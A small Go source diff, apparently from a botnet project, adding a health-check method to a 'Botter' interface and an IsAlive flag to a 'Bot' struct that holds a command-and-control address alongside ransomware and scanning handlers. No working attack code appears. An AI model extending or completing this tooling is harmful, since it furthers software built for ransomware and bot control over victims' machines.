@@ -12,14 +12,18 @@ type Botter interface {
 
 	HandleScan()
 	HandleRansomware()
+
+	CheckBotsHealth() error
+	// CheckBotHealth(botID []byte) error
 }
 
 //Bot is
 type Bot struct {
-	ID     []byte
-	Host   string
-	Port   string
-	CCAddr string
+	ID      []byte
+	Host    string
+	Port    string
+	CCAddr  string
+	IsAlive bool
 }
 
 //Bytes is
